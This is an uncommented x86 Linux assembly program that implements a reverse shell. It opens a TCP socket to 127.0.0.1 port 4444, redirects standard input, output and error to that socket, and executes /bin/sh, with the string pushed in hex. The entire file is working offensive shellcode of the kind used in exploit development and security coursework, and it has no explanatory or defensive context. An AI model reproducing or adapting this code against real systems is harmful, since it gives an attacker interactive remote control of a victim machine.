section .text
    global _start

section .bss
    sockfd: resb 4
    
    struc sockaddr_in
    .family:  resw  1
    .port:    resw  1
    .addr:    resd  1
              resq  1
    endstruc

section .data
    sin:
    istruc sockaddr_in
        at sockaddr_in.family, dw AF_INET
        at sockaddr_in.port, dw 0x5c11
        at sockaddr_in.addr, dd 0x0101017f
    iend

_start:
    sys_connect equ 0x16a
    sys_socket  equ 0x167
    sys_execve  equ 0xb
    sys_dup2    equ 0x3f

    AF_INET equ 2


    socket:
        mov eax, sys_socket
        mov ebx, 0x2 
        mov ecx, 0x1
        mov edx, 0x0
        int 0x80

        mov [sockfd], eax

    connect:
        mov eax, sys_connect
        mov ebx, [sockfd]
        
        mov ecx, sin
        mov edx, sockaddr_in_size
        int 0x80

        xor esi, esi

    dup2:
        mov eax, sys_dup2
        mov ebx, [sockfd] 
        mov ecx, esi
        int 0x80
    
        inc esi
        cmp esi, 3
        jne dup2

    execve:
        mov eax, sys_execve 

        xor edx, edx
        xor ecx, ecx

        push edx
        push dword 0x68732f2f
        push dword 0x6e69622f
        
        mov ebx, esp
        int 0x80

    mov eax, 1
    mov ebx, 0
    int 0x80
